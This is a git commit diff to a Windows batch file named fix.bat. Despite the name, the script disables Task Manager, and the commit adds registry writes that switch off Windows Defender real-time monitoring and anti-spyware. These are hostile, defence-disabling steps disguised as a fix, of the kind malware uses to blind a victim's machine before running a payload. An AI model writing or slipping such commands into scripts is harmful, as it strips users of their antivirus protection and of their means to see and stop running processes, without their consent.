899815d2128062b2a4602084171a30c1ab47c0c5
MidlesLex <154219383+MidlesLex@users.noreply.github.com>
2024-02-14 14:29:21 +0100

    Update fix.bat

--- fix.bat
+++ fix.bat
@@ -1,2 +1,4 @@
 @echo off
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
